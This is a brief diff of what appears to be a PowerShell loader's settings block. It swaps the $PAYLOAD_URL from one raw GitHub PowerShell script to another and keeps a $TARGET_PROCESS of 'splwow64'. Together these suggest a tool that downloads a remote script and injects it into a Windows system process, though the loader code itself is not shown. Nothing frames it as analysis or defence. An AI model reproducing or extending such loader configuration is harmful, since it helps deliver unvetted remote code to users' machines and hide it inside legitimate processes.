@@ -2,7 +2,7 @@
 $LOADER_TITLE   = "Loneza"
 $LOADER_VERSION = "1.0"
 $DISCORD_LINK   = "https://github.com/pupperzz27-dotcom"
-$PAYLOAD_URL    = "https://raw.githubusercontent.com/pupperzz27-dotcom/pro/refs/heads/main/cmd.ps1"
+$PAYLOAD_URL = "https://raw.githubusercontent.com/pupperzz27-dotcom/pro/refs/heads/main/cmd%20(2).ps1"
 $TARGET_PROCESS = "splwow64"
 # ============================
 
